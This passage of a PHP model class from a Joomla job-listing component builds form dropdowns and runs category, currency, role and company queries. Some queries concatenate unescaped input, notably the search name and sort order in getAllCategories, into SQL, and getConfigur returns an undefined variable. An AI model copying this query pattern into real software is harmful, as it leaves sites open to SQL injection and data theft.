            $lists['jobstatus'] = JHTML::_('select.genericList', $this->getJobStatus(''), 'jobstatus', 'class="inputbox required" ' . '', 'value', 'text', $this->_job->jobstatus);
            $lists['educationminimax'] = JHTML::_('select.genericList', $this->getMiniMax(''), 'educationminimax', 'class="inputbox" ' . '', 'value', 'text', $this->_job->educationminimax);
            $lists['education'] = JHTML::_('select.genericList', $this->getHeighestEducation(''), 'educationid', 'class="inputbox" ' . '', 'value', 'text', $this->_job->educationid);
            $lists['minimumeducationrange'] = JHTML::_('select.genericList', $this->getHeighestEducation(JText::_('JS_MINIMUM')), 'mineducationrange', 'class="inputbox" ' . '', 'value', 'text', $this->_job->mineducationrange);
            $lists['maximumeducationrange'] = JHTML::_('select.genericList', $this->getHeighestEducation(JText::_('JS_MAXIMUM')), 'maxeducationrange', 'class="inputbox" ' . '', 'value', 'text', $this->_job->maxeducationrange);

            $lists['shift'] = JHTML::_('select.genericList', $this->getShift(''), 'shift', 'class="inputbox" ' . '', 'value', 'text', $this->_job->shift);
            $lists['salaryrangefrom'] = JHTML::_('select.genericList', $this->getSalaryRange(JText::_('JS_FROM')), 'salaryrangefrom', 'class="inputbox validate-salaryrangefrom" ' . '', 'value', 'text', $this->_job->salaryrangefrom);
            $lists['salaryrangeto'] = JHTML::_('select.genericList', $this->getSalaryRange(JText::_('JS_TO')), 'salaryrangeto', 'class="inputbox validate-salaryrangeto" ' . '', 'value', 'text', $this->_job->salaryrangeto);
            $lists['salaryrangetypes'] = JHTML::_('select.genericList', $this->getSalaryRangeTypes(''), 'salaryrangetype', 'class="inputbox" ' . '', 'value', 'text', $this->_job->salaryrangetype);

            $lists['experienceminimax'] = JHTML::_('select.genericList', $this->getMiniMax(''), 'experienceminimax', 'class="inputbox" ' . '', 'value', 'text', $this->_job->experienceminimax);
            $lists['experience'] = JHTML::_('select.genericList', $this->getExperiences(JText::_('JS_SELECT')), 'experienceid', 'class="inputbox" ' . '', 'value', 'text', $this->_job->experienceid);
            $lists['minimumexperiencerange'] = JHTML::_('select.genericList', $this->getExperiences(JText::_('JS_MINIMUM')), 'minexperiencerange', 'class="inputbox" ' . '', 'value', 'text', $this->_job->minexperiencerange);
            $lists['maximumexperiencerange'] = JHTML::_('select.genericList', $this->getExperiences(JText::_('JS_MAXIMUM')), 'maxexperiencerange', 'class="inputbox" ' . '', 'value', 'text', $this->_job->maxexperiencerange);

            $lists['agefrom'] = JHTML::_('select.genericList', $this->getAges(JText::_('JS_FROM')), 'agefrom', 'class="inputbox validate-checkagefrom" ' . '', 'value', 'text', $this->_job->agefrom);
            $lists['ageto'] = JHTML::_('select.genericList', $this->getAges(JText::_('JS_TO')), 'ageto', 'class="inputbox validate-checkageto" ' . '', 'value', 'text', $this->_job->ageto);

            $lists['gender'] = JHTML::_('select.genericList', $this->getGender(JText::_('JS_DOES_NOT_MATTER')), 'gender', 'class="inputbox " ' . '', 'value', 'text', $this->_job->gender);

            $lists['careerlevel'] = JHTML::_('select.genericList', $this->getCareerLevels(JText::_('JS_SELECT')), 'careerlevel', 'class="inputbox" ' . '', 'value', 'text', $this->_job->careerlevel);
            $lists['workpermit'] = JHTML::_('select.genericList', $this->getCountries(JText::_('JS_SELECT')), 'workpermit', 'class="inputbox" ' . '', 'value', 'text', $this->_job->workpermit);
            $lists['requiredtravel'] = JHTML::_('select.genericList', $this->getRequiredTravel(JText::_('JS_SELECT')), 'requiredtravel', 'class="inputbox" ' . '', 'value', 'text', $this->_job->requiredtravel);

            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', $this->_job->status);
            $lists['sendemail'] = JHTML::_('select.genericList', $this->getSendEmail(), 'sendemail', 'class="inputbox" ' . '', 'value', 'text', $this->_job->sendemail);
            $lists['currencyid'] = JHTML::_('select.genericList', $this->getCurrency(), 'currencyid', 'class="inputbox required" ' . '', 'value', 'text', $this->_job->currencyid);
            $multi_lists = $this->getMultiSelectEdit($this->_job->id, 1);
        } else {
            if (!isset($this->_config)) {
                $this->getConfig();
            }
            $lists['companies'] = JHTML::_('select.genericList', $companies, 'companyid', 'class="inputbox required" ' . 'onChange="getdepartments(\'department\', this.value)"' . '', 'value', 'text', '');
            if (isset($companies[0]['value']))
                $lists['departments'] = JHTML::_('select.genericList', $this->getDepartmentsByCompanyId($companies[0]['value'], ''), 'departmentid', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['jobcategory'] = JHTML::_('select.genericList', $categories, 'jobcategory', 'class="inputbox" ' . 'onChange="fj_getsubcategories(\'fj_subcategory\', this.value)"', 'value', 'text', '');
            $lists['subcategory'] = JHTML::_('select.genericList', $this->getSubCategoriesforCombo($categories[0]['value'], JText::_('JS_SUB_CATEGORY'), ''), 'subcategoryid', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['jobtype'] = JHTML::_('select.genericList', $this->getJobType(''), 'jobtype', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['jobstatus'] = JHTML::_('select.genericList', $this->getJobStatus(''), 'jobstatus', 'class="inputbox required" ' . '', 'value', 'text', '');

            $lists['educationminimax'] = JHTML::_('select.genericList', $this->getMiniMax(''), 'educationminimax', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['education'] = JHTML::_('select.genericList', $this->getHeighestEducation(''), 'educationid', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['minimumeducationrange'] = JHTML::_('select.genericList', $this->getHeighestEducation(JText::_('JS_MINIMUM')), 'mineducationrange', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['maximumeducationrange'] = JHTML::_('select.genericList', $this->getHeighestEducation(JText::_('JS_MAXIMUM')), 'maxeducationrange', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['shift'] = JHTML::_('select.genericList', $this->getShift(''), 'shift', 'class="inputbox" ' . '', 'value', 'text', '');

            $lists['salaryrangefrom'] = JHTML::_('select.genericList', $this->getSalaryRange(JText::_('JS_FROM')), 'salaryrangefrom', 'class="inputbox validate-salaryrangefrom" ' . '', 'value', 'text', '');
            $lists['salaryrangeto'] = JHTML::_('select.genericList', $this->getSalaryRange(JText::_('JS_TO')), 'salaryrangeto', 'class="inputbox validate-salaryrangeto" ' . '', 'value', 'text', '');
            $lists['salaryrangetypes'] = JHTML::_('select.genericList', $this->getSalaryRangeTypes(''), 'salaryrangetype', 'class="inputbox" ' . '', 'value', 'text', '2');


            $lists['experienceminimax'] = JHTML::_('select.genericList', $this->getMiniMax(''), 'experienceminimax', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['experience'] = JHTML::_('select.genericList', $this->getExperiences(JText::_('JS_SELECT')), 'experienceid', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['minimumexperiencerange'] = JHTML::_('select.genericList', $this->getExperiences(JText::_('JS_MINIMUM')), 'minexperiencerange', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['maximumexperiencerange'] = JHTML::_('select.genericList', $this->getExperiences(JText::_('JS_MAXIMUM')), 'maxexperiencerange', 'class="inputbox" ' . '', 'value', 'text', '');

            $lists['agefrom'] = JHTML::_('select.genericList', $this->getAges(JText::_('JS_FROM')), 'agefrom', 'class="inputbox validate-checkagefrom" ' . '', 'value', 'text', '');
            $lists['ageto'] = JHTML::_('select.genericList', $this->getAges(JText::_('JS_TO')), 'ageto', 'class="inputbox validate-checkageto" ' . '', 'value', 'text', '');

            $lists['gender'] = JHTML::_('select.genericList', $this->getGender(JText::_('JS_DOES_NOT_MATTER')), 'gender', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['careerlevel'] = JHTML::_('select.genericList', $this->getCareerLevels(JText::_('JS_SELECT')), 'careerlevel', 'class="inputbox" ' . '', 'value', 'text', '');
            $lists['workpermit'] = JHTML::_('select.genericList', $this->getCountries(JText::_('JS_SELECT')), 'workpermit', 'class="inputbox" ' . '', 'value', 'text', $this->_defaultcountry);
            $lists['requiredtravel'] = JHTML::_('select.genericList', $this->getRequiredTravel(JText::_('JS_SELECT')), 'requiredtravel', 'class="inputbox" ' . '', 'value', 'text', '');

            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['sendemail'] = JHTML::_('select.genericList', $this->getSendEmail(), 'sendemail', 'class="inputbox" ' . '', 'value', 'text', '$this->_job->sendemail', '');
            $lists['currencyid'] = JHTML::_('select.genericList', $this->getCurrency(), 'currencyid', 'class="inputbox required" ' . '', 'value', 'text', '');
        }

        $result[0] = $this->_job;
        $result[1] = $lists;
        $result[2] = $this->getUserFieldsforForm(2, $c_id); // job fields, refid
        $result[3] = $this->getFieldsOrderingforForm(2); // job fields
        if (isset($multi_lists) && $multi_lists != "")
            $result[4] = $multi_lists;
        return $result;
    }

    function &getCurrency($title = "") {
        $db = & JFactory :: getDBO();
        if (!isset($this->_defaultcurrency))
            $this->_defaultcurrency = $this->getDefaultCurrency();
        $q = "SELECT * FROM `#__js_job_currencies` WHERE status = 1 AND id = " . $this->_defaultcurrency;
        if ($this->_client_auth_key != "")
            $q.=" AND serverid!='' AND serverid!=0";
        $db->setQuery($q);
        $defaultcurrency = $db->loadObject();
        $combobox = array();
        if ($title)
            $combobox[] = array('value' => '', 'text' => $title);
        $combobox[] = array('value' => $defaultcurrency->id, 'text' => JText::_($defaultcurrency->symbol));

        $q = "SELECT * FROM `#__js_job_currencies` WHERE status = 1 AND id != " . $defaultcurrency->id;
        if ($this->_client_auth_key != "")
            $q.=" AND serverid!='' AND serverid!=0";
        $db->setQuery($q);
        $allcurrency = $db->loadObjectList();
        foreach ($allcurrency as $currency) {
            $combobox[] = array('value' => $currency->id, 'text' => JText::_($currency->symbol));
        }

        return $combobox;
    }

    function getDefaultCurrency() {
        $db = & JFactory :: getDBO();
        $q = "SELECT currency.id FROM `#__js_job_currencies` currency WHERE currency.default = 1 AND currency.status=1";
        $db->setQuery($q);
        $defaultValue = $db->loadResult();
        if (!$defaultValue) {
            $q = "SELECT id FROM `#__js_job_currencies` WHERE status=1";
            $db->setQuery($q);
            $defaultValue = $db->loadResult();
        }
        return $defaultValue;
    }

    function getDefaultCurrencyValue() {
        $db = & JFactory :: getDBO();
        $q = "SELECT symbol FROM `#__js_job_currencies` AS symbol WHERE symbol.default = 1";
        $db->setQuery($q);
        $defaultValue = $db->loadResult();
        if (!$defaultValue) {
            $q = "SELECT symbol FROM `#__js_job_currencies`";
            $db->setQuery($q);
            $defaultValue = $db->loadResult();
        }
        return $defaultValue;
    }

    function & getEmpAppbyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_resume WHERE id = " . $c_id;

        $db->setQuery($query);
        $this->_application = $db->loadObject();

        $result[0] = $this->_application;
        $result[2] = $this->getUserFieldsforForm(3, $c_id); // job fields , ref id
        $result[3] = $this->getFieldsOrderingforForm(3); // resume fields
        return $result;
    }

    function & getSalaryRangebyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_salaryrange WHERE id = " . $c_id;

        $db->setQuery($query);
        $this->_application = $db->loadObject();
        return $this->_application;
    }

    function & getRolebyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_roles WHERE id = " . $c_id;

        $db->setQuery($query);
        $role = $db->loadObject();
        $for = array(
            '0' => array('value' => 1, 'text' => JText::_('JS_EMPLOYER')),
            '1' => array('value' => 2, 'text' => JText::_('JS_JOB_SEEKER')),);

        if (isset($role)) {
            $lists['rolefor'] = JHTML::_('select.genericList', $for, 'rolefor', 'class="inputbox required" ' . '', 'value', 'text', $role->rolefor);
        } else {
            $lists['rolefor'] = JHTML::_('select.genericList', $for, 'rolefor', 'class="inputbox required" ' . '', 'value', 'text', '');
        }
        $result[0] = $role;
        $result[1] = $lists;
        return $result;
    }

    function & getChangeRolebyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $version = new JVersion;
        $joomla = $version->getShortVersion();
        $jversion = substr($joomla, 0, 3);
        $db = & JFactory :: getDBO();
        if ($jversion == '1.5') {
            $query = 'SELECT a.*, g.name AS groupname, usr.id AS userroleid, usr.role,
                                    role.title AS roletitle , usr.dated AS dated'
                    . ' FROM #__users AS a'
                    . ' INNER JOIN #__core_acl_aro AS aro ON aro.value = a.id'
                    . ' INNER JOIN #__core_acl_groups_aro_map AS gm ON gm.aro_id = aro.id'
                    . ' INNER JOIN #__core_acl_aro_groups AS g ON g.id = gm.group_id'
                    . ' LEFT JOIN #__js_job_userroles AS usr ON usr.uid = a.id '
                    . ' LEFT JOIN #__js_job_roles AS role ON role.id = usr.role'
                    . ' WHERE a.id = ' . $c_id;


            $db->setQuery($query);
            $user = $db->loadObject();
        } else {
            $query = 'SELECT a.*, g.title AS groupname, usr.id AS userroleid, usr.role, 
                            role.title AS roletitle,usr.dated AS dated'
                    . ' FROM #__users AS a'
                    . ' INNER JOIN #__user_usergroup_map AS aro ON aro.user_id = a.id'
                    . ' INNER JOIN #__usergroups AS g ON g.id = aro.group_id'
                    . ' LEFT JOIN #__js_job_userroles AS usr ON usr.uid = a.id '
                    . ' LEFT JOIN #__js_job_roles AS role ON role.id = usr.role'
                    . ' WHERE a.id = ' . $c_id;


            $db->setQuery($query);
            $user = $db->loadObject();
        }
        $roles = $this->getRoles('');
        if (isset($user)) {
            $lists['roles'] = JHTML::_('select.genericList', $roles, 'role', 'class="inputbox required" ' . '', 'value', 'text', $user->role);
        } else {
            $lists['roles'] = JHTML::_('select.genericList', $roles, 'role', 'class="inputbox required" ' . '', 'value', 'text', '');
        }
        $result[0] = $user;
        $result[1] = $lists;
        return $result;
    }

    function & getUserFieldbyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $result = array();
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_userfields WHERE id = " . $db->Quote($c_id);

        $db->setQuery($query);
        $result[0] = $db->loadObject();

        $query = "SELECT * FROM #__js_job_userfieldvalues WHERE field = " . $db->Quote($c_id);

        $db->setQuery($query);
        $result[1] = $db->loadObjectList();

        return $result;
    }

    function & getResumeUserFields($ff) {
        $result = array();
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_fieldsordering 
					WHERE fieldfor = " . $ff . " 
					AND (field = 'section_userfields' OR field = 'userfield1' OR field = 'userfield2'
					OR field = 'userfield3' OR field = 'userfield4' OR field = 'userfield5' OR field = 'userfield6'
					OR field = 'userfield7' OR field = 'userfield8' OR field = 'userfield9' )";

        $db->setQuery($query);
        $result = $db->loadObjectList();

        return $result;
    }

    function & getCountrybyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_countries WHERE id = " . $c_id;
        $db->setQuery($query);
        $country = $db->loadObject();
        return $country;
    }

    function getConfigur() {
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_config WHERE configname = 'refercode' OR configname = 'versioncode' OR configname = 'versiontype'";
        $db->setQuery($query);
        $confs = $db->loadObjectList();
        foreach ($confs AS $conf) {
            if ($conf->configname == 'refercode')
                $rcode = $conf->configvalue;
            if ($conf->configname == 'versioncode')
                $vcode = $conf->configvalue;
            if ($conf->configname == 'versiontype')
                $vtype = $conf->configvalue;
        }

        $result[0] = $value;
        $result[1] = $vcode;
        $result[2] = $vtype;

        return $result;
    }

    function getConfigCount(){
		$db = JFactory::getDBO();
		$query = "SELECT COUNT(*) FROM `#__js_job_config` ";
		$db->setQuery($query);
		$result = $db->loadResult();
		return $result;
	}
    

    function storeActivate() {
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_config WHERE configname = 'refercode'";
        $db->setQuery($query);
        $conf = $db->loadObject();
        if ($conf->configvalue != '0') {
            $row = & $this->getTable('config');
            $data = JRequest :: get('post');
            $str2 = $data['activationkey'];
            $reser_start = substr($conf->configvalue, 2, 3);
            $reser_med = substr($conf->configvalue, 7, 3);
            $reser_end = substr($conf->configvalue, 12, 3);
            $fstr = $reser_start . $reser_med . $reser_end;
            $reser_start = substr($str2, 2, 3);
            $reser_med = substr($str2, 7, 3);
            $reser_end = substr($str2, 12, 3);
            $sstr = $reser_start . $reser_med . $reser_end;
            if (strcmp($fstr, $sstr) == 0) {
                $config['configname'] = 'actk';
                $config['configvalue'] = $data['activationkey'];
				if (!$row->bind($config)){	$this->setError($this->_db->getErrorMsg());	return false;	}
				if (!$row->store())	{	$this->setError($this->_db->getErrorMsg());	return false;	}
				$config['configname'] = 'offline'; $config['configvalue'] = 0;
				if (!$row->bind($config)){	$this->setError($this->_db->getErrorMsg());	return false;	}
				if (!$row->store())	{	$this->setError($this->_db->getErrorMsg());	return false;	}
				$config['configname'] = 'fr_cr_txsh';
				$config['configvalue'] = '0';
				if (!$row->bind($config)){	$this->setError($this->_db->getErrorMsg());	return false;	}
				if (!$row->store())	{	$this->setError($this->_db->getErrorMsg());	return false;	}
			}else return 3;
		}else return 4;

        return true;
    }

    function & getAllCategories($searchname, $sortby, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        if ($searchname) {
            $wherequery = " WHERE cat_title LIKE '%" . $searchname . "%' ORDER BY cat_title $sortby";
        } else {
            $wherequery = " ORDER BY cat_title $sortby";
        }
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_categories";
        $query .= $wherequery;
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT * FROM #__js_job_categories";
        $query .= $wherequery;

        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $list['searchname'] = $searchname;
        $result[0] = $this->_application;
        $result[1] = $total;
        $result[2] = $list;
        return $result;
    }

    function & getSubCategories($categoryid, $limitstart, $limit) {
        if (is_numeric($categoryid) == false)
            return false;
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_subcategories WHERE categoryid = " . $categoryid;
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT subcategory.*,category.cat_title 
							FROM #__js_job_subcategories AS subcategory
                            JOIN #__js_job_categories AS category ON category.id = subcategory.categoryid 
                            WHERE subcategory.categoryid = " . $categoryid . " ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);
        $subcategories = $db->loadObjectList();

        $query = "SELECT cat_title FROM #__js_job_categories WHERE id = " . $categoryid;
        $db->setQuery($query);
        $category = $db->loadObject();

        $result[0] = $subcategories;
        $result[1] = $total;
        $result[2] = $category;
        return $result;
    }

    function & getAllJobTypes($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_jobtypes";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT * FROM #__js_job_jobtypes ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getAllAges($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_ages";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT * FROM #__js_job_ages ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getAllCareerLevels($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_careerlevels";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT * FROM #__js_job_careerlevels ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getAllExperience($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_experiences";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT * FROM #__js_job_experiences ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getAllSalaryRangeType($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_salaryrangetypes";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT * FROM #__js_job_salaryrangetypes ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getAllJobStatus($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_jobstatus";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT * FROM #__js_job_jobstatus ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getAllShifts($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_shifts";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT * FROM #__js_job_shifts ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getAllHighestEducations($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_heighesteducation";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT * FROM #__js_job_heighesteducation ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function getAllCurrencies($limitstart, $limit) {
        $db = & JFactory::getDBO();
        $query = "SELECT count(id) FROM `#__js_job_currencies`";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT * FROM `#__js_job_currencies` ORDER BY title ASC ";
        $db->setQuery($query, $limitstart, $limit);
        $currencyresults = $db->loadObjectList();

        $result[0] = $currencyresults;
        $result[1] = $total;

        return $result;
    }

    function & getAllFolders($uid, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_folders";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT folder.*,company.name as companyname
                                , ( SELECT count(id) FROM `#__js_job_folderresumes` WHERE folder.id = folderid) AS nor
			FROM `#__js_job_folders` AS folder
			LEFT JOIN `#__js_job_companies` AS company ON company.uid = folder.uid
			WHERE folder.status <> 0 GROUP BY id";
        $db->setQuery($query, $limitstart, $limit);
        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getAllUnapprovedFolders($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_folders AS folder WHERE folder.status = 0";

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT folder.*,company.name as companyname
				FROM `#__js_job_folders` AS folder
				JOIN `#__js_job_companies` AS company ON company.uid = folder.uid
				WHERE folder.status = 0";

        $query .= " GROUP BY folder.id ORDER BY folder.created DESC";


        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $result[0] = $this->_application;
        $result[1] = $total;
        return $result;
    }

    function & getAllCompanies($searchcompany, $searchjobcategory, $searchcountry, $limitstart, $limit) {
        if ($searchjobcategory)
            if (is_numeric($searchjobcategory) == false)
                return false;
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_companies AS company WHERE company.status <> 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchjobcategory)
            $query .= " AND company.category = " . $searchjobcategory;
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT company.*, cat.cat_title 
				FROM #__js_job_companies AS company  
				JOIN #__js_job_categories AS cat ON company.category = cat.id
				WHERE company.status <> 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchjobcategory)
            $query .= " AND company.category = " . $searchjobcategory;
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);

        $query .= " ORDER BY company.created DESC";


        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $lists = array();
        $job_categories = $this->getCategories(JText::_('JS_SELECT_JOB_CATEGORY'), '');
        $countries = $this->getCountries(JText::_('JS_SELECT_COUNTRY'));
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchjobcategory)
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"', 'value', 'text', $searchjobcategory);
        else
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"', 'value', 'text', '');
        if ($searchcountry)
            $lists['country'] = JHTML::_('select.genericList', $countries, 'searchcountry', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchcountry);
        else
            $lists['country'] = JHTML::_('select.genericList', $countries, 'searchcountry', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $this->_application;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllUnapprovedCompanies($searchcompany, $searchjobcategory, $searchcountry, $limitstart, $limit) {
        if ($searchjobcategory)
            if (is_numeric($searchjobcategory) == false)
                return false;
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_companies AS company WHERE company.status = 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchjobcategory)
            $query .= " AND company.category = " . $searchjobcategory;
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT company.*, cat.cat_title  
				FROM #__js_job_companies AS company  
				JOIN #__js_job_categories AS cat ON company.category = cat.id
				WHERE company.status = 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchjobcategory)
            $query .= " AND company.category = " . $searchjobcategory;
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);

        $query .= " ORDER BY company.created DESC";

        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $lists = array();


        $job_categories = $this->getCategories(JText::_('JS_SELECT_JOB_CATEGORY'), '');
        $countries = $this->getCountries(JText::_('JS_SELECT_COUNTRY'));
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchjobcategory)
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"', 'value', 'text', $searchjobcategory);
        else
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"', 'value', 'text', '');

        $result[0] = $this->_application;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function getAllJobAlerts($searchname, $limitstart, $limit) {
        $db = &$this->getDBO();
        $query = "SELECT COUNT(*) FROM `#__js_job_jobalertsetting` ";
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT alert.*,cat.cat_title,subcat.title 
					FROM `#__js_job_jobalertsetting` AS alert
					JOIN `#__js_job_categories` AS cat ON alert.categoryid = cat.id
					LEFT JOIN `#__js_job_subcategories` AS subcat ON alert.subcategoryid = subcat.id";
        if ($searchname)
            $query .= " WHERE LOWER(alert.name) LIKE " . $db->Quote('%' . $searchname . '%', false);

        $db->setQuery($query, $limitstart, $limit);
        $jobalerts = $db->loadObjectList();
        $lists = array();
        if ($searchname)
            $lists['searchname'] = $searchname;
        $result[0] = $jobalerts;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllJobs($searchtitle, $searchcompany, $searchjobcategory, $searchjobtype, $limitstart, $limit) {
        if ($searchjobcategory)
            if (is_numeric($searchjobcategory) == false)
                return false;
        if ($searchjobtype)
            if (is_numeric($searchjobtype) == false)
                return false;
        $this->checkCall();

        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(job.id) FROM `#__js_job_jobs` AS job
					LEFT JOIN `#__js_job_companies` AS company ON job.companyid = company.id 
					WHERE job.status <> 0";
        if ($searchtitle)
            $query .= " AND LOWER(job.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
